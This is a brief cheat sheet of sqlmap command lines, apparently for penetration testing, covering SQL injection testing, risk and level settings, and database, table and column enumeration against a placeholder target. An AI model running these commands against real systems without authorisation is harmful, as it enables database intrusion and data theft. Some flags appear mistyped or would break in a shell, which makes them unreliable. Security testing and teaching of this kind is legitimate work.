# SQLmap

## Simple usage

```
sqlmap -u "http://target_server/"
```

## Set target DBMS to MySQL
```
sqlmap -u "http://target_server/" --dbms=mysql
```

## Use POST requests

```
sqlmap -u "http://target_server/" --data=param1=value1&param2=value2
```

## Use POST request file

```
sqlmap -r request.txt -p [param-to-test]
```

## Batch run

```
sqlmap -r request.txt -p [param-to-test] --Batch
```

## Set Risk/Level

```
sqlmap -r request.txt -p psw --level=5 --risk=3 --dbms mysql --batch
```

## enumerate databases

```
sqlmap -r request.txt --batch --dbs
``` 

## enumerate tables

``` 
sqlmap -r request.txt -batch --tables
``` 

## brute-force tables

```
sqlmap -r request.txt -batch --common-tables
```

## brute-force columns

```
sqlmap -r request.txt -batch -T users --common-column
```